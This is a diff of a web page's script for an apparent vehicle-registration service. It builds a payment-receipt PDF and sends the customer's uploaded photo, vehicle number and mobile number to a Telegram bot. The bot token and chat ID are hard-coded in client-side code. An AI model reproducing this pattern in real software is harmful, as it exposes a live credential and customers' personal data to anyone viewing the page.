@@ -164,7 +164,6 @@
             const v = document.getElementById('vehInput').value;
             const m = document.getElementById('mob').value;
 
-            // Wahi Purana Box Layout PDF
             doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
             doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
             doc.setTextColor(255); doc.setFontSize(24); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
@@ -192,7 +191,6 @@
                 "6. In case of delay, contact support with this receipt screenshot."
             ];
             doc.text(tnc, 20, 130);
-
             doc.setTextColor(150); doc.setFontSize(9);
             doc.text("© 2026 RCPDF.IN | Apex Solution | Digital Vahan Services India", 105, 280, null, null, "center");
             doc.save(`Receipt_${v}.pdf`);
@@ -203,9 +201,18 @@
             let fd = new FormData();
             fd.append("chat_id", "5600045707");
             fd.append("photo", f);
-            let msg = `🚀 NEW RC ORDER\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}`;
+            let msg = `🚀 NEW RC ORDER\n\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}\n💰 Amt: ₹120`;
             fd.append("caption", msg);
-            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd});
+
+            // Telegram API Call
+            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {
+                method: "POST",
+                body: fd
+            }).then(res => {
+                if(!res.ok) { console.error("Telegram error occurred"); }
+            }).catch(err => {
+                console.error("Fetch error:", err);
+            });
         }
     </script>
 </body>
